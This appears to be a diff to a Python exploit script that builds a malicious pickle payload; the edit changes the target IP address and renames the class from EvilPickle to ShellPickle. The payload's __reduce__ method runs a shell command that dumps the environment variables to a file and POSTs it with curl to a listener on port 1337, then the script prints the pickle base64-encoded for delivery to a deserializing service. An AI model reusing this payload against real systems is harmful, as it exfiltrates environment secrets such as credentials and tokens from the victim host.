@@ -14,13 +14,13 @@ import pickle
 import base64
 import os
 
-local_ip = "172.16.31.17"
+local_ip = "192.168.0.102"
 
-class EvilPickle(object):
+class ShellPickle(object):
     def __reduce__(self):
         cmd = "/bin/bash -c 'env >/tmp/env_output'"
         send_cmd = f"curl -X POST -H 'Transfer-Encoding: chunked' -T /tmp/env_output http://{local_ip}:1337"
         return (os.system, (f'{cmd} && {send_cmd}',))
 
-evil_pickle = pickle.dumps(EvilPickle())
+evil_pickle = pickle.dumps(ShellPickle())
 print(base64.b64encode(evil_pickle).decode())
